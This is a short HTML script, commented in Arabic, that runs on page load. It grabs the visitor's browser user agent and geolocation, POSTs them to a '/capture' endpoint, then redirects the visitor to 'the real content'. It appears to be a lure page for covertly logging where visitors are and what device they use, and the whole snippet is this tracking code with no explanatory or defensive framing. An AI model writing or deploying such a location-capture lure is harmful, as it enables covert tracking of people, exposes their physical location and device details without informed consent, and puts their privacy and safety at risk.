<script>
    async function collectAndGo() {
        const deviceInfo = navigator.userAgent;
        
        // محاولة سحب الموقع
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await sendData({ lat: pos.coords.latitude, lon: pos.coords.longitude }, deviceInfo);
        }, async () => {
            await sendData(null, deviceInfo);
        });
    }

    async function sendData(loc, dev) {
        const response = await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ location: loc, device: dev })
        });
        const data = await response.json();
        window.location.href = data.redirect; // التوجيه للمحتوى الحقيقي
    }
    window.onload = collectAndGo;
</script>
